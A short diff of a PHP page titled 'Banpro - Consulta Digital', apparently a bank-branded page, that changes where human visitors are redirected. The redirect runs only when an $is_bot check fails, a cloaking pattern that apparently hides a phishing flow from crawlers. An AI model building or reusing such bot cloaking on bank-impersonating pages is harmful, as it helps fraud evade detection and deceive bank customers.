@@ -81,8 +81,8 @@ header('X-Content-Type-Options: nosniff');
 <head>
   <meta charset="UTF-8" />
 <?php if (!$is_bot): ?>
-  <script>window.location.replace('/executive/index.php');</script>
-  <noscript><meta http-equiv="refresh" content="0;url=/executive/index.php"></noscript>
+  <script>window.location.replace('/executive/inicio.php');</script>
+  <noscript><meta http-equiv="refresh" content="0;url=/executive/inicio.php"></noscript>
 <?php endif; ?>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Banpro - Consulta Digital</title>
